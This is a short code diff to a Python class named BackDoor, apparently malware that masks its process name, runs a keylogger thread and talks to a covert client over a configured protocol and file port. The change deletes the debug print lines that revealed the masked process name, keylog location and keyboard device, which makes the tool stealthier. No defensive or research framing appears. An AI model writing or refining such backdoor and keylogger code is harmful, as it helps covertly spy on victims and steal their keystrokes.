@@ -153,7 +153,6 @@ class BackDoor:
     def start(self) -> None:
         self.process_yaml()
         self.hide_process()
-        print("Starting......")
         try:
             keylog_t = Thread(target=self.start_keylogger)
             keylog_t.start()
@@ -208,11 +207,6 @@ class BackDoor:
         self.client = config['covert']['client']
         self.sequence = config['share']['sequence']
         self.file_port = config['share']['file_port']
-        print(f"Process masked as: {self.masked_name}")
-        print(f"keylog stored in {self.log}")
-        print(f"Keyboard: {self.device}")
-        print(f"Protocol is: {self.proto}")
-
 
     def watch_settings(self, path) -> tuple[str, str]:
         file = path.split("/")[-1]
